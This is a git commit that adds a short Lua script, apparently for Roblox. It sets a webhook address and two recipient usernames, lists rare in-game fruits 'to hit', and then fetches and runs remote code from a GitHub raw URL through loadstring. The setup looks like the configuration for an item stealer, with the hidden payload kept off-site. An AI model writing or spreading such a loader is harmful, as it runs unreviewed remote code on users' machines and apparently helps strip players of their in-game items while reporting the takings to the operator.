8f6c28926cb55d4de0978af767688cd8b07dff58
BannaKeyless <jayforgms.r@gmail.com>
2025-03-10 20:28:39 +0000

    Create Banna.lua

---
+++ Banna.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=ZTNUX2tHT1lCSkdzc0QwRWQ2QTU5ZzpNMWNZSWVsUGlBYnNYdzl4SXBBdjlDTjRjX3Bnal9oWUpVS2M2dDAwMXU5b1J6LXlvTWJnM2swc2Ntd3lOTkVjQmdjQWthTXFoVXZGakN4R0VwQzZ3MHFIT1RncVZXTzZjUi11b2RHSnNiWXd6bzg5VDl6Q25UcFNKeXZ5VUxRaWNyZHZXS0E2dThhdzVPYmp4RE5XcHM2NjZ3X3AyajJwS2ppdUpsSHNXc2c" -- << Your Webhook
+Usernames = {"VUJXMA12", "Kj1111741"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
